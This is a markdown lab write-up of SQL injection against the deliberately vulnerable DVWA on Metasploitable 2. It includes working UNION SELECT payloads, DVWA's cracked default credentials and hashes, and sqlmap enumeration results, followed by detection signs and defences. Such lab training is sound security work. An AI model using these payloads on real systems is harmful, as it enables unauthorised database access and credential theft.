# Attack 04 — SQL Injection (Manual & Automated)
**Tool:** Manual + sqlmap | **Target:** DVWA on Metasploitable 2 | **Difficulty:** Intermediate

---

## What is SQL Injection?
SQL Injection is ranked in OWASP Top 10 and is one of the most
dangerous web application vulnerabilities in existence.

Every website with a login page, search box, or any input field
runs SQL queries in the background. When a developer writes code
that passes user input directly into that SQL query without
sanitization — an attacker can manipulate the entire query.

The result: complete database access, authentication bypass,
and in some cases full server control.

---

## What is DVWA?
DVWA (Damn Vulnerable Web Application) is a deliberately broken
web application designed for security training. It runs on
Metasploitable 2 and contains intentionally vulnerable pages
for SQL Injection, XSS, File Inclusion and more.

---

## Lab Environment
| Role | Details |
|------|---------|
| Attacker | Kali Linux 2025.2 |
| Target | Metasploitable 2 — 192.168.6.129 |
| Application | DVWA at http://192.168.6.129/dvwa |
| Tools | Manual browser injection + sqlmap |

---

## Attack Walkthrough

### Phase 1 — Setup
Accessed DVWA and set security level to LOW.
This removes all input sanitization making the application
fully vulnerable to injection attacks.

### Phase 2 — Confirming Vulnerability
Typed a single quote ' into the User ID field.
The database threw a MySQL syntax error back at us.
This error proves the input is going directly into
the SQL query with zero protection.
```
Error: You have an error in your SQL syntax near '''' at line 1
```

This single character just confirmed the entire database
is accessible to an attacker.

### Phase 3 — Manual Union Injection
Used UNION SELECT to extract database information:
```
1' UNION SELECT user(), database()-- -
```

Result:
```
First name: root@localhost
Surname: dvwa
```

The web application is running as ROOT database user.
This is a critical misconfiguration — root access means
the attacker can potentially read any file on the server.

### Phase 4 — Dumping Password Hashes
Pulled all usernames and password hashes directly
from the users table:
```
1' UNION SELECT user, password FROM users-- -
```

Result — all 5 users and their MD5 hashes exposed.

### Phase 5 — Cracking The Hashes
Used john the ripper to crack all MD5 hashes:
```
admin    : password
gordonb  : abc123
1337     : charley
pablo    : letmein
smithy   : password
```

All 5 passwords cracked. 5 out of 5. Zero failures.

### Phase 6 — Automated Attack With sqlmap
sqlmap automatically found 7 databases on the server:
```
dvwa
information_schema
metasploit
mysql
owasp10
tikiwiki
tikiwiki195
```

Finding the metasploit and mysql databases confirms
complete access to the most sensitive data on the server.

---

## Cracked Credentials Summary

| Username | MD5 Hash | Cracked Password |
|----------|----------|-----------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

---

## MITRE ATT&CK
| Field | Detail |
|-------|--------|
| Tactic | Initial Access |
| Technique | T1190 — Exploit Public Facing Application |

---

## How SOC Analysts Detect SQL Injection
- WAF logs showing SQL keywords: UNION SELECT DROP INSERT
- URL encoded SQL in web logs: %27 means single quote
- High volume of 500 errors from same IP
- sqlmap has distinctive User-Agent header — easy to spot
- Database error messages appearing in HTTP responses

---

## Defence Mechanisms
| Defence | Why It Works |
|---------|-------------|
| Parameterized queries | User input never touches SQL structure |
| Web Application Firewall | Blocks SQL keywords in requests |
| Least privilege database user | Web app gets SELECT only — no FILE privilege |
| Disable error messages | Attacker cannot see database structure |
| Regular DAST scanning | Find SQLi before attackers do |

---

## Key Lesson
SQL Injection is 30 years old and still in OWASP Top 10.
It exists entirely because developers concatenate user input
into SQL queries instead of using parameterized queries.

The fix is one line of code. Yet it remains one of the most
common vulnerabilities found in web applications today.

As a SOC analyst — any request containing SQL keywords
from the same IP must be treated as an active attack.

---

## Evidence Files
| File | Contents |
|------|---------|
| sqlmap_results.txt | Full sqlmap database enumeration output |
| sqlmap_users_dump.txt | User table dump output |
| dvwa_hashes.txt | Raw MD5 hashes extracted |
| screenshots/ | Visual proof of every attack phase |